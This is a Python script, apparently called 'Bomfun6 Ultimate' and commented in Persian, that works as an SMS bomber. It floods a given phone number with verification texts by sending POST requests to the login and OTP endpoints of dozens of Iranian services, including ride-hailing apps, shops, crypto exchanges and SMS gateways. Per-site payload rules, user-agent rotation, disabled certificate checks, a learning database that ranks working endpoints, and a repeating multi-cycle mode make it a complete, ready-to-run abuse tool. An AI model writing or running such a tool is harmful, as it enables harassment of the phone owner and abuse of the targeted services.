#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bomfun6 Ultimate - با مغز یادگیرنده SQL
"""

import re
import sys
import ssl
import time
import gzip
import zlib
import json
import random
import socket
import signal
import hashlib
import threading
import http.cookiejar
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from typing import Optional, List, Tuple, Generator
from concurrent.futures import ThreadPoolExecutor, as_completed

from brain import Brain
from sites_priority import PRIORITY_SITES
from sites_secondary import SECONDARY_SITES

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# تنظیمات
# ═══════════════════════════════════════════════════════════════

DEFAULT_MAX = 10
BASE_DELAY = 0.8
MAX_DELAY = 5.0
TIMEOUT = 8
MAX_WORKERS = 4
MAX_RETRY = 1
AUTOSAVE_EVERY = 5

MODE_26_CYCLES = 7
MODE_26_INTERVAL = 120
MODE_26_SENDS_PER_CYCLE = 10

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE
try:
    SSL_CTX.set_ciphers('DEFAULT@SECLEVEL=1')
except Exception:
    pass

# ═══════════════════════════════════════════════════════════════
# وضعیت مشترک
# ═══════════════════════════════════════════════════════════════

stop_event = threading.Event()
print_lock = threading.Lock()
progress_lock = threading.Lock()

session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]

# آمار جاری (فقط برای نمایش، ذخیره در SQL)
session_stats = {
    "success": 0, "failed": 0, "blocked": 0, "not_found": 0,
    "network_error": 0, "rate_limited": 0, "bad_payload": 0,
    "working": set(), "dead": set(),
}
stats_lock = threading.Lock()

progress = {"done": 0, "total": 0}

# ═══════════════════════════════════════════════════════════════
# مغز
# ═══════════════════════════════════════════════════════════════

brain = Brain()
brain.register_sites(PRIORITY_SITES)
brain.register_sites(SECONDARY_SITES)

# ═══════════════════════════════════════════════════════════════
# ابزار
# ═══════════════════════════════════════════════════════════════

def host_from_url(url: str) -> str:
    try:
        return url.split("/")[2]
    except (IndexError, AttributeError):
        return url


def normalize_phone(raw: str) -> str:
    s = re.sub(r"[\s\-\(\)\.]", "", raw or "")
    if s.startswith("+98"):
        s = "0" + s[3:]
    elif s.startswith("0098"):
        s = "0" + s[4:]
    elif s.startswith("98") and len(s) == 12:
        s = "0" + s[2:]
    elif s.startswith("9") and len(s) == 10:
        s = "0" + s
    return s


def is_valid_phone(phone: str) -> bool:
    return bool(re.fullmatch(r"09\d{9}", phone))


def safe_print(msg: str):
    with print_lock:
        sys.stdout.write("\r" + " " * 100 + "\r")
        print(msg, flush=True)


def render_line(text: str):
    with print_lock:
        sys.stdout.write("\r" + " " * 100 + "\r" + text)
        sys.stdout.flush()


def show_progress():
    with progress_lock:
        progress["done"] += 1
        d = progress["done"]
        t = progress["total"]
        filled = int(25 * d / t) if t else 0
        bar = "█" * filled + "░" * (25 - filled)
        pct = int(100 * d / t) if t else 0
    render_line(f"  [{bar}] {d}/{t} ({pct}%)")


def status_msg(status: int) -> str:
    m = {
        -1: "خطای شبکه", -2: "تایم‌اوت", -3: "SSL خطا",
        -4: "متوقف", -5: "Cooldown",
        400: "بدنه نامعتبر", 401: "نیاز به احراز", 403: "بلاک",
        404: "یافت نشد", 405: "متد نامعتبر", 422: "پارامتر نامعتبر",
        429: "Rate Limit",
    }
    if status in m:
        return m[status]
    if 200 <= status < 300:
        return f"موفق ✅ ({status})"
    return f"رد ❌ ({status})"


# ═══════════════════════════════════════════════════════════════
# HTTP Client
# ═══════════════════════════════════════════════════════════════

cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar),
    urllib.request.HTTPSHandler(context=SSL_CTX),
)


def build_headers() -> dict:
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
        "Connection": "close",
        "Cache-Control": "no-cache",
    }


def decompress(resp):
    try:
        enc = (resp.headers.get("Content-Encoding") or "").lower()
        raw = resp.read()
        if "gzip" in enc:
            return gzip.decompress(raw)
        if "deflate" in enc:
            try:
                return zlib.decompress(raw)
            except zlib.error:
                return zlib.decompress(raw, -zlib.MAX_WBITS)
        return raw
    except Exception:
        return b""


def do_post(url: str, data: dict) -> Tuple[int, dict]:
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(url, data=body, headers=build_headers(), method="POST")
    with opener.open(req, timeout=TIMEOUT) as resp:
        decompress(resp)
        return resp.status, dict(resp.headers)


def do_get(url: str) -> Tuple[int, dict]:
    req = urllib.request.Request(url, headers=build_headers(), method="GET")
    with opener.open(req, timeout=TIMEOUT) as resp:
        decompress(resp)
        return resp.status, dict(resp.headers)


# ═══════════════════════════════════════════════════════════════
# Payload Variants
# ═══════════════════════════════════════════════════════════════

def payload_variants(url: str, phone: str) -> Generator[Tuple[str, dict], None, None]:
    host = host_from_url(url).lower()

    # اگر مغز variant یاد گرفته، اول همان را امتحان کن
    learned = brain.get_preferred_variant(url)
    if learned:
        try:
            data = json.loads(learned)
            for k in list(data.keys()):
                if isinstance(data[k], str):
                    data[k] = phone
            yield "learned", data
            return
        except Exception:
            pass

    # قوانین مخصوص دامنه
    host_rules = {
        "divar": {"phone": phone},
        "sheypoor": {"mobile": phone},
        "snapp.taxi": {"cellphone": phone},
        "snappfood": {"cellphone": phone, "phone": phone},
        "snappmarket": {"cellphone": phone, "phone": phone},
        "snappexpress": {"cellphone": phone, "phone": phone},
        "snapptrip": {"cellphone": phone, "phone": phone},
        "snapp.ir": {"cellphone": phone},
        "digikala": {"username": phone, "phone": phone},
        "alibaba": {"mobile": phone},
        "tapsi": {"phone": phone, "cellphone": phone},
        "tap33": {"phone": phone, "mobile": phone},
        "achareh": {"phone": phone},
        "jabama": {"mobile": phone},
        "banimode": {"mobile": phone, "username": phone},
        "itoll": {"phone": phone},
        "mootanroo": {"mobile": phone},
        "lendo": {"phone": phone, "mobile": phone},
        "namava": {"phoneNumber": phone, "phone": phone},
        "hamrah-mechanic": {"phone": phone, "mobile": phone},
        "abantether": {"phone": phone},
        "classino": {"mobile": phone},
        "nobat": {"mobile": phone, "phone": phone},
        "okcs": {"mobile": phone},
        "tebinja": {"mobile": phone, "phone": phone},
        "bit24": {"mobile": phone},
        "bale": {"phone": phone, "mobile": phone},
        "zarinpal": {"mobile": phone},
        "kavenegar": {"receptor": phone},
        "ippanel": {"sending_type": "pattern", "recipient": phone},
        "melipayamak": {"to": phone},
        "ghasedak": {"receptor": phone},
        "farapayamak": {"to": phone},
        "sms.ir": {"mobile": phone},
        "nobitex": {"phone": phone, "mobile": phone},
        "melligold": {"mobile": phone, "phone": phone},
        "tlyn": {"mobile": phone, "phone": phone},
        "taline": {"mobile": phone, "phone": phone},
        "tondton": {"mobile": phone, "phone": phone},
        "tetherland": {"mobile": phone, "phone": phone},
        "wallex": {"mobile": phone, "phone": phone},
        "bitpin": {"mobile": phone, "phone": phone},
        "ramzinex": {"mobile": phone, "phone": phone},
        "tabdeal": {"mobile": phone, "phone": phone},
        "arzinja": {"mobile": phone, "phone": phone},
        "exir": {"mobile": phone, "phone": phone},
        "pay98": {"mobile": phone, "phone": phone},
        "coin.ir": {"mobile": phone, "phone": phone},
        "parsbit": {"mobile": phone, "phone": phone},
        "ajax-finance": {"mobile": phone, "phone": phone},
        "asa-coin": {"mobile": phone, "phone": phone},
        "bitmax": {"mobile": phone, "phone": phone},
        "poolno": {"mobile": phone, "phone": phone},
        "altax": {"mobile": phone, "phone": phone},
        "bitsubit": {"mobile": phone, "phone": phone},
        "zarindex": {"mobile": phone, "phone": phone},
        "digistyle": {"mobile": phone, "phone": phone},
        "modiseh": {"mobile": phone, "phone": phone},
        "bamilo": {"mobile": phone, "phone": phone},
        "takhfifan": {"mobile": phone, "phone": phone},
        "aparat": {"mobile": phone},
        "cafebazaar": {"phone": phone, "mobile": phone},
        "myket": {"phone": phone, "mobile": phone},
        "sibapp": {"phone": phone, "mobile": phone},
        "talasea": {"mobile": phone, "phone": phone},
        "tala.ir": {"mobile": phone, "phone": phone},
        "wallgold": {"mobile": phone, "phone": phone},
        "daric": {"mobile": phone, "phone": phone},
        "goldika": {"mobile": phone, "phone": phone},
        "milli.gold": {"mobile": phone, "phone": phone},
        "zarpad": {"mobile": phone, "phone": phone},
        "technogold": {"mobile": phone, "phone": phone},
        "tokeniko": {"mobile": phone, "phone": phone},
        "invi": {"mobile": phone, "phone": phone},
        "zarafza": {"mobile": phone, "phone": phone},
        "zarpey": {"mobile": phone, "phone": phone},
    }

    for key, payload in host_rules.items():
        if key in host:
            yield f"host_{key}", payload
            return

    # variantهای عمومی
    yield "phone_only", {"phone": phone}
    yield "mobile_only", {"mobile": phone}
    yield "cellphone_only", {"cellphone": phone}
    yield "username_phone", {"username": phone}
    yield "to", {"to": phone}
    yield "receptor", {"receptor": phone}
    yield "recipient", {"recipient": phone}
    yield "msisdn", {"msisdn": phone}
    yield "phoneNumber", {"phoneNumber": phone}
    yield "user_mobile", {"user": {"mobile": phone}}
    yield "data_mobile", {"data": {"mobile": phone}}
    yield "all_fields", {
        "phone": phone, "mobile": phone,
        "cellphone": phone, "username": phone,
    }


# ═══════════════════════════════════════════════════════════════
# ثبت نتایج
# ═══════════════════════════════════════════════════════════════

def record_stats(url: str, status: int):
    with stats_lock:
        if 200 <= status < 300:
            session_stats["success"] += 1
            session_stats["working"].add(url)
        elif status == 404:
            session_stats["not_found"] += 1
            session_stats["dead"].add(url)
        elif status == 429:
            session_stats["rate_limited"] += 1
        elif status in (401, 403):
            session_stats["blocked"] += 1
        elif status in (-1, -2, -3, -4, -5):
            session_stats["network_error"] += 1
        elif status in (400, 422):
            session_stats["bad_payload"] += 1
        else:
            session_stats["failed"] += 1


def log_result(url: str, status: int, score: float = 0):
    t = datetime.now().strftime("%H:%M:%S")
    host = host_from_url(url)
    safe_print(f"[{t}] [{host}] → {status_msg(status)} | امتیاز: {score:.0f}")
    record_stats(url, status)


# ═══════════════════════════════════════════════════════════════
# ارسال یک درخواست
# ═══════════════════════════════════════════════════════════════

def send_one(url: str, phone: str):
    if stop_event.is_set():
        return

    if brain.is_circuit_open(url):
        rem = brain.cooldown_remaining(url)
        safe_print(f"⏸ [{host_from_url(url)}] در cooldown ({rem}s)")
        return

    start = time.time()
    last_status = -1
    last_variant = ""

    for attempt in range(1, MAX_RETRY + 2):
        if stop_event.is_set():
            return

        for vkey, data in payload_variants(url, phone):
            if stop_event.is_set():
                return

            last_variant = vkey
            try:
                status, headers = do_post(url, data)

                if status == 429 and attempt <= MAX_RETRY:
                    ra = headers.get("Retry-After", "2")
                    try:
                        wait = min(int(ra), 5)
                    except (ValueError, TypeError):
                        wait = 2
                    time.sleep(wait)
                    continue

                if 200 <= status < 300:
                    lat = time.time() - start
                    brain.record(url, status, lat, vkey, session_id)
                    log_result(url, status, brain.get_score(url))
                    return

                if status in (400, 422):
                    last_status = status
                    continue

                if status in (401, 403):
                    lat = time.time() - start
                    brain.record(url, status, lat, vkey, session_id)
                    log_result(url, status, brain.get_score(url))
                    return

                if status in (404, 405):
                    try:
                        s2, _ = do_get(url)
                        lat = time.time() - start
                        brain.record(url, s2, lat, "GET", session_id)
                        log_result(url, s2, brain.get_score(url))
                        return
                    except urllib.error.HTTPError as e2:
                        lat = time.time() - start
                        brain.record(url, e2.code, lat, "GET", session_id)
                        log_result(url, e2.code, brain.get_score(url))
                        return
                    except Exception:
                        lat = time.time() - start
                        brain.record(url, -1, lat, "GET", session_id)
                        log_result(url, -1, brain.get_score(url))
                        return

                if 500 <= status < 600:
                    last_status = status
                    continue

                lat = time.time() - start
                brain.record(url, status, lat, vkey, session_id)
                log_result(url, status, brain.get_score(url))
                return

            except urllib.error.HTTPError as e:
                if e.code in (400, 422):
                    last_status = e.code
                    continue
                if e.code in (404, 405):
                    try:
                        s2, _ = do_get(url)
                        lat = time.time() - start
                        brain.record(url, s2, lat, "GET", session_id)
                        log_result(url, s2, brain.get_score(url))
                        return
                    except urllib.error.HTTPError as e2:
                        lat = time.time() - start
                        brain.record(url, e2.code, lat, "GET", session_id)
                        log_result(url, e2.code, brain.get_score(url))
                        return
                    except Exception:
                        lat = time.time() - start
                        brain.record(url, -1, lat, "GET", session_id)
                        log_result(url, -1, brain.get_score(url))
                        return
                if e.code == 429 and attempt <= MAX_RETRY:
                    try:
                        ra = e.headers.get("Retry-After", "2") if e.headers else "2"
                        wait = min(int(ra), 5)
                    except (ValueError, TypeError):
                        wait = 2
                    time.sleep(wait)
                    continue
                if e.code >= 500 and attempt <= MAX_RETRY:
                    time.sleep(1)
                    continue
                lat = time.time() - start
                brain.record(url, e.code, lat, vkey, session_id)
                log_result(url, e.code, brain.get_score(url))
                return

            except urllib.error.URLError as e:
                reason = str(getattr(e, "reason", ""))
                if "SSL" in reason or "CERTIFICATE" in reason.upper():
                    lat = time.time() - start
                    brain.record(url, -3, lat, vkey, session_id)
                    log_result(url, -3, brain.get_score(url))
                    return
                if attempt <= MAX_RETRY:
                    time.sleep(1)
                    continue
                lat = time.time() - start
                brain.record(url, -1, lat, vkey, session_id)
                log_result(url, -1, brain.get_score(url))
                return

            except (TimeoutError, socket.timeout):
                lat = time.time() - start
                brain.record(url, -2, lat, vkey, session_id)
                log_result(url, -2, brain.get_score(url))
                return

            except (ConnectionResetError, ConnectionError, ConnectionAbortedError):
                if attempt <= MAX_RETRY:
                    time.sleep(1)
                    continue
                lat = time.time() - start
                brain.record(url, -1, lat, vkey, session_id)
                log_result(url, -1, brain.get_score(url))
                return

            except ssl.SSLError:
                lat = time.time() - start
                brain.record(url, -3, lat, vkey, session_id)
                log_result(url, -3, brain.get_score(url))
                return

            except Exception as e:
                safe_print(f"[!] {type(e).__name__}: {e}")
                lat = time.time() - start
                brain.record(url, -1, lat, vkey, session_id)
                log_result(url, -1, brain.get_score(url))
                return

    lat = time.time() - start
    brain.record(url, last_status, lat, last_variant, session_id)
    log_result(url, last_status, brain.get_score(url))


# ═══════════════════════════════════════════════════════════════
# ساخت لیست هدف با اولویت مغز
# ═══════════════════════════════════════════════════════════════

def build_targets(max_sends: int) -> List[str]:
    priority_urls = [s[0] for s in PRIORITY_SITES]
    secondary_urls = [s[0] for s in SECONDARY_SITES]
    all_urls = list(dict.fromkeys(priority_urls + secondary_urls))

    # مغز اولویت‌بندی می‌کند
    sorted_urls = brain.sorted_urls(all_urls)

    # حذف cooldown
    available = [u for u in sorted_urls if not brain.is_circuit_open(u)]
    if not available:
        available = sorted_urls

    # اگر max_sends کمتر از تعداد سایت‌ها، فقط اولی‌ها
    if max_sends <= len(available):
        return available[:max_sends]

    # چرخش
    targets = []
    idx = 0
    while len(targets) < max_sends:
        targets.append(available[idx % len(available)])
        idx += 1
    return targets


# ═══════════════════════════════════════════════════════════════
# اجرای یک دور
# ═══════════════════════════════════════════════════════════════

def run_once(phone: str, max_sends: int, label: str = "") -> float:
    start = datetime.now()
    targets = build_targets(max_sends)

    with progress_lock:
        progress["total"] = len(targets)
        progress["done"] = 0

    if label:
        safe_print(f"▶ {label} — شروع {len(targets)} ارسال")

    delay = BASE_DELAY
    recent_429 = 0

    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    futures = []
    try:
        for site in targets:
            if stop_event.is_set():
                break
            try:
                futures.append(executor.submit(send_one, site, phone))
            except Exception as e:
                safe_print(f"[!] submit error: {e}")

            if session_stats["rate_limited"] > recent_429:
                recent_429 = session_stats["rate_limited"]
                delay = min(delay * 1.5, MAX_DELAY)
            else:
                delay = max(BASE_DELAY, delay * 0.95)

            time.sleep(delay)

        for f in as_completed(futures):
            try:
                f.result()
            except Exception:
                pass
            show_progress()
    finally:
        executor.shutdown(wait=False)

    elapsed = (datetime.now() - start).total_seconds()
    with print_lock:
        sys.stdout.write("\r" + " " * 100 + "\r")
        sys.stdout.flush()

    return elapsed


def print_final(elapsed: float):
    brain_stats = brain.get_stats()
    with print_lock:
        sys.stdout.write("\r" + " " * 100 + "\r")
        print("═" * 60)
        print(f"  ✅ موفق:          {session_stats['success']}")
        print(f"  ❌ ناموفق:        {session_stats['failed']}")
        print(f"  🔒 بلاک/کپچا:     {session_stats['blocked']}")
        print(f"  ⏳ Rate Limit:    {session_stats['rate_limited']}")
        print(f"  📝 بدنه خراب:     {session_stats['bad_payload']}")
        print(f"  ❓ 404:           {session_stats['not_found']}")
        print(f"  📡 خطای شبکه:     {session_stats['network_error']}")
        print(f"  ⏱  زمان کل:       {elapsed:.1f}s")
        print("─" * 60)
        print(f"  🧠 مغز:           کل={brain_stats['total']} | سالم={brain_stats['good']} | "
              f"متوسط={brain_stats['mid']} | ضعیف={brain_stats['bad']} | cooldown={brain_stats['cooling']}")
        print(f"  💾 دیتابیس:       bomfun6.db")
        print(f"  🎯 سایت سالم:     {len(session_stats['working'])}")
        print(f"  💀 سایت مرده:     {len(session_stats['dead'])}")
        print("═" * 60)

        # Top 5 سایت
        top = brain.get_top_sites(5)
        if top:
            print("\n  🏆 برترین سایت‌ها:")
            for i, s in enumerate(top, 1):
                name = s["name"] or host_from_url(s["url"])
                print(f"     {i}. {name} — امتیاز {s['score']:.0f} | ✅{s['success_count']} ❌{s['fail_count']}")
            print()


# ═══════════════════════════════════════════════════════════════
# حالت 26
# ═══════════════════════════════════════════════════════════════

def countdown(seconds: int):
    try:
        for rem in range(seconds, 0, -1):
            if stop_event.is_set():
                return
            m, s = divmod(rem, 60)
            render_line(f"  ⏳ دور بعدی در {m:02d}:{s:02d} ... (Ctrl+C برای توقف)")
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        raise
    finally:
        render_line("")


def run_mode_26(phone: str, sends_per_cycle: int):
    print("\n" + "═" * 60)
    print("       🔁 حالت ۲۶ فعال شد")
    print(f"       {MODE_26_CYCLES} دور × {sends_per_cycle} ارسال")
    print(f"       فاصله: {MODE_26_INTERVAL}s")
    print("═" * 60 + "\n")

    total_start = datetime.now()
    for cycle in range(1, MODE_26_CYCLES + 1):
        if stop_event.is_set():
            break
        label = f"دور {cycle}/{MODE_26_CYCLES}"
        print()
        safe_print(f"🚀 {label} شروع")
        elapsed = run_once(phone, sends_per_cycle, label)
        safe_print(f"✅ {label} تمام شد در {elapsed:.1f}s")

        if cycle < MODE_26_CYCLES and not stop_event.is_set():
            countdown(MODE_26_INTERVAL)

    total_elapsed = (datetime.now() - total_start).total_seconds()
    print()
    print("═" * 60)
    print("       ⛔ متوقف شد" if stop_event.is_set() else "       🏁 حالت ۲۶ تمام شد")
    print("═" * 60)
    print_final(total_elapsed)


# ═══════════════════════════════════════════════════════════════
# Signal Handling
# ═══════════════════════════════════════════════════════════════

def install_signal_handler():
    def handler(signum, frame):
        stop_event.set()
        raise KeyboardInterrupt()
    try:
        signal.signal(signal.SIGINT, handler)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# ورودی‌ها
# ═══════════════════════════════════════════════════════════════

def get_mode() -> str:
    while True:
        m = input("  حالت: 1=عادی  26=تکرار  b=آمار مغز  r=ریست امتیاز  q=خروج: ").strip().lower()
        if m in ("1", "26", "b", "r", "q"):
            return m
        print("  1، 26، b، r یا q")


def get_phone() -> str:
    raw = input("  شماره خودت (09xxxxxxxxx): ").strip()
    return normalize_phone(raw)


def get_max_sends(default: int = DEFAULT_MAX) -> int:
    raw = input(f"  چند ارسال؟ (پیش‌فرض {default}): ").strip()
    if not raw:
        return default
    try:
        n = int(raw)
        return n if 1 <= n <= 500 else default
    except ValueError:
        return default


def show_brain_stats():
    s = brain.get_stats()
    print("\n" + "═" * 60)
    print(f"  🧠 آمار مغز")
    print("═" * 60)
    print(f"  کل سایت‌ها:      {s['total']}")
    print(f"  سالم (≥60):      {s['good']}")
    print(f"  متوسط (30-59):   {s['mid']}")
    print(f"  ضعیف (<30):      {s['bad']}")
    print(f"  در cooldown:     {s['cooling']}")

    top = brain.get_top_sites(15)
    if top:
        print("\n  🏆 ۱۵ سایت برتر:")
        for i, site in enumerate(top, 1):
            name = site["name"] or host_from_url(site["url"])
            print(f"     {i:2d}. {name[:30]:30s} | امتیاز {site['score']:5.1f} | ✅{site['success_count']:3d} ❌{site['fail_count']:3d}")

    daily = brain.get_daily_stats(7)
    if daily:
        print("\n  📅 آمار روزانه:")
        for d in daily:
            print(f"     {d['date']} | کل={d['total']:3d} | ✅{d['success']:3d} | ❌{d['failed']:3d} | 🔒{d['blocked']:3d}")

    print()
    brain.export_to_json()


# ═══════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════

def main():
    install_signal_handler()

    print("╔" + "═" * 58 + "╗")
    print("║" + "   Bomfun6 Ultimate - با مغز یادگیرنده SQL".center(58) + "║")
    print("╚" + "═" * 58 + "╝")
    total = len(PRIORITY_SITES) + len(SECONDARY_SITES)
    brain_stats = brain.get_stats()
    print(f"  📊 سایت‌ها: {total} (اولویت: {len(PRIORITY_SITES)} | ذخیره: {len(SECONDARY_SITES)})")
    print(f"  🧠 مغز: {brain_stats['good']} سالم، {brain_stats['bad']} ضعیف، {brain_stats['cooling']} cooldown")
    print()

    mode = get_mode()

    if mode == "q":
        print("  خداحافظ!")
        return

    if mode == "b":
        show_brain_stats()
        return

    if mode == "r":
        confirm = input("  مطمئنی؟ امتیاز همه سایت‌ها ریست می‌شود (y/n): ").strip().lower()
        if confirm == "y":
            brain.reset_scores()
            print("  ✅ ریست شد.")
        return

    if mode == "26":
        phone = get_phone()
        if not is_valid_phone(phone):
            print("  ❌ شماره نامعتبر.")
            return
        sends = get_max_sends(MODE_26_SENDS_PER_CYCLE)
        try:
            run_mode_26(phone, sends)
        except KeyboardInterrupt:
            print("\n\n  ⛔ متوقف شد.")
        return

    phone = get_phone()
    if not is_valid_phone(phone):
        print("  ❌ شماره نامعتبر.")
        return

    max_sends = get_max_sends()
    print(f"\n  🚀 شروع ({max_sends} درخواست)...\n")

    try:
        elapsed = run_once(phone, max_sends, "ارسال")
        print()
        print_final(elapsed)
    except KeyboardInterrupt:
        print("\n\n  ⛔ متوقف شد.")
        print_final(0)


if __name__ == "__main__":
    main()